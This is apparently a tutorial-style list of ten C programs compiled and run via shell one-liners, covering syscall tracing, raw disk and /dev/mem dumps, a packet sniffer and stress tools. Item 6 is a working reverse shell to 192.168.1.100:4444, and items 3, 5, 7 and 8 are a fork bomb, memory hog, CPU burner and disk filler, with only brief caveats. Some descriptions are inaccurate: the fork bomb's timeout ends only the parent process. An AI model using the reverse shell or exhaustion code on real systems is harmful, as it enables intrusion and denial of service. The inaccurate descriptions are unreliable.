### **1. Real-Time System Call Tracker**

This program will capture system calls made by the current shell and its children in real time, similar to `strace` but embedded directly.

```bash
echo '#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <unistd.h>

int main() {
    pid_t child = fork();
    if(child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl("/bin/ls", "ls", NULL);
    } else {
        int status;
        struct user_regs_struct regs;
        while(1) {
            wait(&status);
            if(WIFEXITED(status)) break;
            ptrace(PTRACE_GETREGS, child, NULL, &regs);
            printf("Syscall %lld called with RDI=%lld\n", regs.orig_rax, regs.rdi);
            ptrace(PTRACE_SYSCALL, child, NULL, NULL);
        }
    }
    return 0;
}' | gcc -x c - -o syscall_trace && ./syscall_trace
```

**Description**: This program forks a new process, attaches `ptrace` for syscall tracking, and runs `/bin/ls`. It prints each syscall in real time, showing the syscall number and arguments. Useful for deep diagnostics or reverse engineering. 

---

### **2. Direct Disk Writer: A Raw Disk Hex Viewer**

Directly reads from a raw disk and prints it in a hex format, providing a very low-level view of the data on your storage.

```bash
echo '#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/dev/sda", O_RDONLY);
    unsigned char buffer[512];
    if (fd < 0) return 1;
    read(fd, buffer, 512);
    for (int i = 0; i < 512; i++) printf("%02x ", buffer[i]);
    close(fd);
    return 0;
}' | gcc -x c - -o hexviewer && sudo ./hexviewer
```

**Description**: Reads the first 512 bytes of `/dev/sda` and prints it in hexadecimal. **Warning**: Be cautious with raw disk access, especially on production systems, as even reading can interfere in certain contexts.

---

### **3. Fork Bomb with a Controlled Timeout**

Creates a C-based fork bomb that auto-terminates after a few seconds.

```bash
echo '#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>

void alarm_handler(int sig) {
    exit(0);
}

int main() {
    signal(SIGALRM, alarm_handler);
    alarm(5);  // auto-terminate after 5 seconds
    while(1) fork();
    return 0;
}' | gcc -x c - -o forkbomb && ./forkbomb
```

**Description**: This fork bomb spawns infinite processes, but the `alarm` call limits it to a 5-second duration. Use for performance testing, simulating high-load conditions, or just for fun (in safe environments only).

---

### **4. Network Packet Sniffer (Low-Level)**

A simple raw packet sniffer that captures all packets on an interface and outputs them in hexadecimal format.

```bash
echo '#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    unsigned char buffer[2048];
    while (1) {
        int data_size = recvfrom(s, buffer, 2048, 0, NULL, NULL);
        for (int i = 0; i < data_size; i++) printf("%02x ", buffer[i]);
        printf("\n");
    }
    close(s);
    return 0;
}' | gcc -x c - -o sniffer && sudo ./sniffer
```

**Description**: This sniffer captures all packets at the Ethernet layer, printing them in hex. It operates similarly to `tcpdump` but written directly in C for minimal overhead.

---

### **5. Memory Overwriter for Stress Testing**

Allocates and writes into increasingly larger memory blocks until the system runs out of memory (be cautious with this one).

```bash
echo '#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main() {
    size_t size = 1024 * 1024 * 10;  // start with 10 MB
    while (1) {
        void *p = malloc(size);
        if (!p) break;
        memset(p, 0, size);  // force allocation to physical memory
        printf("Allocated %zu bytes\n", size);
        size += 1024 * 1024 * 10;  // increase by 10 MB each time
        sleep(1);
    }
    return 0;
}' | gcc -x c - -o memoryhog && ./memoryhog
```

**Description**: Continuously allocates and fills memory, increasing by 10 MB each time until failure. Useful for testing how a system handles memory pressure and the effects of the OOM (Out of Memory) killer.

---

### **6. Reverse Shell**

Establishes a reverse shell to a specified IP and port. Only use on test systems with permission!

```bash
echo '#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("192.168.1.100");  // replace with your IP
    server.sin_port = htons(4444);  // replace with your port
    connect(s, (struct sockaddr *)&server, sizeof(server));
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}' | gcc -x c - -o reverseshell && ./reverseshell
```

**Description**: Connects to a specified IP and port, creating a reverse shell. Use for ethical hacking or testing network security controls with proper authorization only.

---

### **7. CPU Burner**

This program maxes out all CPU cores for stress testing.

```bash
echo '#include <pthread.h>
#include <stdio.h>

void *burn_cpu(void *arg) {
    while (1) {}
    return NULL;
}

int main() {
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t threads[cores];
    for (int i = 0; i < cores; i++)
        pthread_create(&threads[i], NULL, burn_cpu, NULL);
    for (int i = 0; i < cores; i++)
        pthread_join(threads[i], NULL);
    return 0;
}' | gcc -x c - -o cpuburn && ./cpuburn
```

**Description**: Spawns a CPU-burning thread for each core, running indefinitely. Great for testing cooling systems, performance under load, or throttling behavior.

---

### **8. Disk Filler**

Fills up disk space rapidly for testing disk capacity limits and how applications handle full storage.

```bash
echo '#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd = open("bigfile.bin", O_CREAT | O_WRONLY, 0666);
    while (1) {
        write(fd, "0", 1);
    }
    close(fd);
    return 0;
}' | gcc -x c - -o diskfiller && ./diskfiller
```

**Description**: Creates a file and continuously writes data until the disk fills up. **Use carefully** as it can impact other applications relying on disk space.

---

### **9. System Call Counter**

Counts how many times each syscall is called within a 5-second period.

```bash
echo '#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

int main() {
    pid_t child = fork();
    if (child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl("/bin/bash", "bash", NULL);
    } else {
        int status, count = 0;
        while (1) {
            wait(&status);
            if (WIFEXITED(status)) break;
            ptrace(PTRACE_SYSCALL, child, NULL, NULL);
            count++;
            if (count == 5000) {
                printf("System call count: %d\n", count);
                break;
            }
        }
    }
    return 0;
}' | gcc -x c - -o syscallcounter && ./syscallcounter
```

**Description**: Runs a bash process under `ptrace`, counting each system call until reaching 5000 calls or exiting. Use this for performance profiling.

---

### **10. Kernel Memory Dumper**

This code

 attempts to dump raw memory, providing insight into what’s in RAM (may require elevated privileges).

```bash
echo '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd = open("/dev/mem", O_RDONLY);
    unsigned char buffer[1024];
    if (fd < 0) return 1;
    read(fd, buffer, 1024);
    for (int i = 0; i < 1024; i++) printf("%02x ", buffer[i]);
    close(fd);
    return 0;
}' | gcc -x c - -o memdump && sudo ./memdump
```

**Description**: Dumps the first 1024 bytes of physical memory in hex format, which can reveal kernel and application data. Use sparingly and only for educational purposes. **Note**: May be restricted on some systems for security reasons.

